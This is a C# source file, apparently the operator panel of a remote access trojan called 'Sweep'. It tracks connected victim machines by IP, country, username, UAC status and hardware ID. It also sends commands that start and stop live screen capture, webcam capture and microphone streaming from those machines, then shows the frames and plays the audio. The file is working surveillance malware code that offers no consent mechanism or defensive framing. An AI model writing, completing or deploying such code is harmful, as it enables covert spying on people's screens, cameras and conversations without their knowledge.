using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using BrightIdeasSoftware;
using LazyServer;
using Newtonsoft.Json.Linq;
using Sweep.Forms;
using Sweep.Models;
using Sweep.UI;
using NAudio.Wave;

namespace Sweep.Services
{
    public class MessageHandler
    {
        private readonly LazyServerHost _server;
        private readonly ObjectListView _listView;
        private readonly ObjectListView _logsview;
        private ScreenViewer viewer;
        private WebcamViewer webcamViewer;
        private string previousid = string.Empty;
        private Sweep.Forms.Sweep _sweepform;
        private MicViewer micViewer;

        // Audio playback components
        private WaveOutEvent waveOut;
        private BufferedWaveProvider bufferedProvider;

        public MessageHandler(LazyServerHost server, ObjectListView listView, int port, ObjectListView logsview, Forms.Sweep th)
        {
            _server = server ?? throw new ArgumentNullException(nameof(server));
            _listView = listView ?? throw new ArgumentNullException(nameof(listView));
            _logsview = logsview ?? throw new ArgumentNullException(nameof(logsview));
            _sweepform = th ?? throw new ArgumentNullException(nameof(th));

            ListViewConfigurator.Configure(_listView, port);

            _server.MessageReceived += OnTextMessageReceived;
            _server.FileOfferWithMetaReceived += OnFileOfferWithMetaReceived;
            _server.ClientDisconnected += OnClientDisconnected;
        }

        private void OnTextMessageReceived(object sender, MessageEventArgs e)
        {
            Console.WriteLine($"[MSG] From {e.ClientId}: {e.Message}");
        }

        private async void OnFileOfferWithMetaReceived(object sender, FileOfferWithMetaEventArgs e)
        {
            JObject meta;
            try
            {
                meta = JObject.Parse(e.FileRequest.Metadata);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Invalid JSON metadata: " + ex.Message);
                return;
            }

            var msgType = (string)meta["msg"] ?? "";
            switch (msgType)
            {
                case "alive":
                    await HandleAliveAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                    break;

                case "screenshot":
                    await HandleScreenshotAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                    break;

                case "log":
                    AddLogToList(meta);
                    break;

                case "camframe":
                    await HandleWebcamAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                    break;

                case "micaudio":
                    await HandleMicAudioAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                    break;

                default:
                    Console.WriteLine($"[WARN] Unknown msg type '{msgType}' from {e.ClientId}");
                    break;
            }
        }

        private void AddLogToList(JObject meta)
        {
            var log = new Log
            {
                Time = DateTime.Now.ToString("HH:mm:ss"),
                Message = (string)meta["message"],
                Type = (string)meta["type"]
            };

            if (_listView.InvokeRequired)
            {
                _logsview.Invoke(new Action(() => _logsview.AddObject(log)));
            }
            else
            {
                _logsview.AddObject(log);
            }
        }

        private async Task HandleWebcamAsync(JObject meta, string clientId, byte[] packet)
        {
            if (webcamViewer == null || webcamViewer.IsDisposed || clientId != previousid)
            {
                var ctrl = _listView;

                void ShowViewer()
                {
                    webcamViewer = new WebcamViewer();
                    webcamViewer.Show();

                    webcamViewer.QualityChanged += async (string quality) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = "camloop",
                            ["quality"] = quality
                        }.ToString());
                    };

                    webcamViewer.Closing += async () =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = "stopcam"
                        }.ToString());
                    };

                    webcamViewer.ScreenEvent += async (bool active) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = active ? "camloop" : "stopcam"
                        }.ToString());
                    };

                    webcamViewer.MonitorChanged += async (int index) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = "cam",
                            ["idx"] = index
                        }.ToString());
                    };
                }

                if (ctrl.InvokeRequired)
                    ctrl.Invoke((Action)ShowViewer);
                else
                    ShowViewer();
            }

            previousid = clientId;
            int camCount = (int?)meta["cameras"] ?? 1;
            webcamViewer.SetMonitors(camCount);

            try
            {
                using var ms = new MemoryStream(packet);
                var frame = Image.FromStream(ms);
                webcamViewer.SetScreen(frame);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in HandleWebcamAsync: " + ex);
            }
        }

        private async Task HandleScreenshotAsync(JObject meta, string clientId, byte[] packet)
        {
            if (viewer == null || viewer.IsDisposed || clientId != previousid)
            {
                var ctrl = _listView;

                void ShowViewer()
                {
                    viewer = new ScreenViewer();
                    viewer.Show();
                    viewer.SetMonitors((int)meta["monitors"]);

                    viewer.QualityChanged += async (string quality) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = "ssloop",
                            ["quality"] = quality
                        }.ToString());
                    };

                    viewer.Closing += async () =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = "stopss"
                        }.ToString());
                    };

                    viewer.ScreenEvent += async (bool active) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = active ? "ssloop" : "stopss"
                        }.ToString());
                    };

                    viewer.MonitorChanged += async (int index) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = "mon",
                            ["idx"] = index
                        }.ToString());
                    };
                }

                if (ctrl.InvokeRequired)
                    ctrl.Invoke((Action)ShowViewer);
                else
                    ShowViewer();
            }

            previousid = clientId;

            try
            {
                using var ms = new MemoryStream(packet);
                var image = Image.FromStream(ms);
                viewer.SetScreen(image);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in HandleScreenshotAsync: " + ex);
            }
        }

        private async Task HandleAliveAsync(JObject meta, string clientId, byte[] packet)
        {
            try
            {
                var ip = (string)meta["ip"];
                var flag = await FlagDownloader.GetFlagImageByIpAsync(ip);
                var country = await FlagDownloader.GetCountryAsync(ip);

                using var ms = new MemoryStream(packet);
                var screen = Image.FromStream(ms);

                var client = new ClientInfo
                {
                    Screen = screen,
                    IP = ip,
                    Country = country,
                    Flag = flag,
                    ID = clientId,
                    Username = (string)meta["username"],
                    OperatingSystem = (string)meta["os"],
                    CPU = (string)meta["cpu"],
                    GPU = (string)meta["gpu"],
                    UAC = (string)meta["uac"],
                    HWID = (string)meta["hwid"],
                };

                if (_listView.InvokeRequired)
                    _listView.BeginInvoke(new Action(() => _listView.AddObject(client)));
                else
                    _listView.AddObject(client);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in HandleAliveAsync: " + ex);
            }
        }

        private async Task HandleMicAudioAsync(JObject meta, string clientId, byte[] audioBytes)
        {
            var ctrl = _listView;
            if (micViewer == null || micViewer.IsDisposed || clientId != previousid)
            {
                void CreateForm()
                {
                    micViewer = new MicViewer();
                    micViewer.SetMonitors((int)meta["microphones"]);

                    micViewer.Mic += async (bool y) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = y ? "micloop" : "stopmic",
                        }.ToString());
                    };

                    micViewer.DeviceChanged += async (int y) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = "stopmic",
                        }.ToString());
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = "mic",
                            ["idx"] = y
                        }.ToString());
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = "micloop",
                        }.ToString());
                    };

                    micViewer.MicClosing += async () => {
                        await _server.SendMessageToClient(clientId, new JObject
                        {
                            ["command"] = "stopmic",
                        }.ToString());
                    };

                    micViewer.Show();
                }

                if (ctrl.InvokeRequired)
                    ctrl.Invoke((Action)CreateForm);
                else
                    CreateForm();
            }

            previousid = clientId;

            try
            {
                if (waveOut == null || bufferedProvider == null)
                {
                    var waveFormat = new WaveFormat(8000, 1); // 8 kHz, mono to match client

                    bufferedProvider = new BufferedWaveProvider(waveFormat)
                    {
                        DiscardOnBufferOverflow = true,
                        BufferLength = 1024 * 100
                    };

                    waveOut = new WaveOutEvent();
                    waveOut.Init(bufferedProvider);
                    waveOut.Play();
                }

                bufferedProvider.AddSamples(audioBytes, 0, audioBytes.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error playing mic audio: " + ex);
            }
        }


        private void OnClientDisconnected(object sender, string clientId)
        {
            if (_listView.InvokeRequired)
            {
                _listView.Invoke(new Action(() => RemoveClientById(clientId)));
            }
            else
            {
                RemoveClientById(clientId);
            }

            // Clean up audio playback
            waveOut?.Stop();
            waveOut?.Dispose();
            waveOut = null;
            bufferedProvider = null;
        }

        private void RemoveClientById(string clientId)
        {
            try
            {
                var obj = _listView.Objects.Cast<ClientInfo>().FirstOrDefault(c => c.ID == clientId);
                if (obj != null)
                {
                    _listView.RemoveObject(obj);
                    Console.WriteLine($"Client disconnected and removed: {clientId}");
                }
            }
            catch {};
        }
    }
}
